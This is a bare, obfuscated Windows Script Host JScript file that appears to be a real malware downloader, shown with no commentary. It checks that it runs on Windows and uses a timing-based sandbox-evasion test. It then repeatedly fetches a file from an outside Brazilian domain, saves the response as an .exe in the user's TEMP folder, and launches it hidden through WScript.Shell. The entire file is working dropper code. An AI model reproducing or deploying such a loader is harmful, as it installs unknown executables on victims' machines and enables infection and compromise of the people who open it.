var t0 = false;
var nn = "CreateObject";
var qs = function RM() {return WScript[nn]("WScript.Shell");}(), P = 11;
var h = "MSXML2.XMLHTTP";
var E = 2123213;
var qJ = 0;
function w(Su){qs["Run"](Su, qJ, qJ);};
function I(){return "" + h;};
function Gg(B, Tr){qJ = qJ * 1; return B - Tr;};
function Yk(){return nn;};
/*@cc_on
  @if (@_win32 || @_win64)
    t0 = true;
  @end
@*/
if (t0)
{
var ZV = "";
function j(){return 22;};
var NR = 0; var X = 0;
function A()
{
var uq = new this["Date"]();
var My = uq["getUTCMilliseconds"]();
WScript["Sleep"](j());
var uq = new this["Date"]();
var G = uq["getUTCMilliseconds"]();
WScript["Sleep"](j());
var uq = new this["Date"]();
var mV = uq["getUTCMilliseconds"]();
var NR = "VR";
NR = Gg(G, My);
var X = "AK";
X = Gg(mV, G);
ZV = "open";
return Gg(NR, X);
}
var nU = false;
var pI = false;
for (var Pn = qJ; Pn < j() * 1; Pn++){if (A() != qJ){
nU = true; 
X = "31" + 11 * NR + X; 
pI = true; 
break;
}}
function QL() {return ((nU == true) && (nU == pI)) ? 1 : qJ;};
if (nU && QL() && pI){
function lg() {return qs["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "9yi4zPye9zftT.exe";};
 Q = I();
 aQ = WScript[nn](Q);
 var q = 1;
 while (q){
try {
aQ[ZV]("GET", "http://digimacro.com.br/m8isda", false);
aQ["send"]();
t = "Sleep";
for (;;){WScript[t](j() * 11); if (aQ["readystate"] >= 2 * 2) break;};
q = qJ;
} catch(F){};
}
function m(Ds) {var b = (1, 2, 3, 4, 5, Ds); return b;};
An = WScript[Yk()]("ADODB.Stream");
Q = An;
Q[ZV]();
Q["type"] = m(1);
Q["write"](aQ["ResponseBody"]);
An["position"] = m(qJ);
Q["Save" + "ToFile"](lg(), 2);
An["c"+"lose"]();
f = lg();
w(f);
}
}

